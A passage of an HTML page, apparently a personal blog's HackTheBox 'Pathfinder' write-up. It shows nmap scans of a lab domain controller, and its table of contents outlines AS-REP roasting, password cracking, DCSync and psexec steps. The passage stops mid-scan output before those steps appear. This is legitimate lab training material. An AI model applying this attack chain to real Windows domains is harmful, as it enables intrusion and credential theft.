@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackTheBox - Pathfinder Writeup | SH∆FIQ ∆IM∆N</title>
+<meta property="og:title" content="HackTheBox - Pathfinder Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="twitter:title" content="HackTheBox - Pathfinder Writeup | SH∆FIQ ∆IM∆N" />
+<meta itemprop="name" content="HackTheBox - Pathfinder Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="application-name" content="HackTheBox - Pathfinder Writeup | SH∆FIQ ∆IM∆N" />
+<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="http://example.com" />
+  <meta property="og:image" content="http://example.com" />
+  <meta name="twitter:image" content="http://example.com" />
+  <meta name="twitter:image:src" content="http://example.com" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2021-07-21T00:00:00Z />
+    <meta property="article:published_time" content=2021-07-21T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackTheBox - Pathfinder Writeup",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2021-07-21",
+        "description": "",
+        "wordCount":  1386 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2021-07-21",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "SH∆FIQ ∆IM∆N"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.119.0">
+
+    
+
+    <link rel="canonical" href="http://example.com/posts/htb/pathfinder/">
+    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://example.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://example.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackTheBox - Pathfinder Writeup</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2021-07-21T00:00:00&#43;00:00" itemprop="datePublished"> 21 Jul 2021 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#hosts">Hosts</a></li>
+      </ul>
+    </li>
+    <li><a href="#ldap">LDAP</a>
+      <ul>
+        <li><a href="#ldapsearch">LDAPsearch</a></li>
+        <li><a href="#ldap-query-ldapsearch">LDAP QUERY [ldapsearch]</a></li>
+        <li><a href="#ldap-dump-ldapsearch">LDAP DUMP [ldapsearch]</a></li>
+        <li><a href="#ldap-dump--user-ldapsearch">LDAP DUMP  USER [ldapsearch]</a></li>
+        <li><a href="#ldap-dump---ldapdomaindump">LDAP DUMP   [ldapdomaindump]</a></li>
+      </ul>
+    </li>
+    <li><a href="#kerberos">Kerberos</a>
+      <ul>
+        <li><a href="#kerberos---dont_req_preauth">Kerberos - [DONT_REQ_PREAUTH]</a></li>
+        <li><a href="#impacket-getnpuserspy">Impacket [GetNPUsers.py]</a></li>
+        <li><a href="#john-the-ripper">John-The-Ripper</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a></li>
+    <li><a href="#evil-winrm">Evil-Winrm</a>
+      <ul>
+        <li><a href="#user-flag">User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#dcsync-attack">DCSync Attack</a>
+      <ul>
+        <li><a href="#impacket-secretsdumppy">Impacket [SecretsDump.py]</a></li>
+        <li><a href="#impacket-psexecpy">Impacket [psexec.py]</a></li>
+        <li><a href="#admin-flag">Admin flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>scan top 1000 ports</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">30</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">44</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">30</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">30</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">34</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">989</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">       </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="k">domain</span><span class="w">        </span><span class="k">Simple</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="n">Plus</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span><span class="w">  </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="n">server</span><span class="w"> </span><span class="n">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">02</span><span class="n">Z</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">   </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ldap</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Active</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="p">(</span><span class="k">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">MEGACORP</span><span class="p">.</span><span class="n">LOCAL0</span><span class="p">.,</span><span class="w"> </span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="k">Default</span><span class="o">-</span><span class="k">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">kpasswd5</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ncacn_http</span><span class="w">    </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">tcpwrapped</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ldap</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Active</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="p">(</span><span class="k">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">MEGACORP</span><span class="p">.</span><span class="n">LOCAL0</span><span class="p">.,</span><span class="w"> </span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="k">Default</span><span class="o">-</span><span class="k">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">tcpwrapped</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="k">Host</span><span class="p">:</span><span class="w"> </span><span class="n">PATHFINDER</span><span class="p">;</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span><span class="w"> </span><span class="mi">7</span><span class="n">h07m25s</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="k">security</span><span class="o">-</span><span class="k">mode</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">2</span><span class="p">.</span><span class="mi">02</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">required</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">10</span><span class="n">T01</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">31</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">start_date</span><span class="p">:</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">21</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 96.82 seconds
+</span></span></span></code></pre></div><ul>
+<li>scan all ports</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">30</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="mi">07</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">25</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="n">megacorp</span><span class="p">.</span><span class="k">local</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">megacorp</span><span class="p">.</span><span class="k">local</span><span class="w"> </span><span class="p">(</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">30</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">34</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">rDNS</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">30</span><span class="p">:</span><span class="w"> </span><span class="n">MEGACORP</span><span class="p">.</span><span class="k">LOCAL</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65511</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">       </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="k">domain</span><span class="w">        </span><span class="k">Simple</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="n">Plus</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span><span class="w">  </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="n">server</span><span class="w"> </span><span class="n">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">13</span><span class="w"> </span><span class="mi">07</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">15</span><span class="n">Z</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">   </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ldap</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Active</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="p">(</span><span class="k">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">MEGACORP</span><span class="p">.</span><span class="n">LOCAL0</span><span class="p">.,</span><span class="w"> </span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="k">Default</span><span class="o">-</span><span class="k">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">kpasswd5</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ncacn_http</span><span class="w">    </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">tcpwrapped</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ldap</span><span class="w">          </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Active</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="p">(</span><span class="k">Domain</span><span class="p">:</span><span class="w"> </span><span class="n">MEGACORP</span><span class="p">.</span><span class="n">LOCAL0</span><span class="p">.,</span><span class="w"> </span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="k">Default</span><span class="o">-</span><span class="k">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span><span class="w">
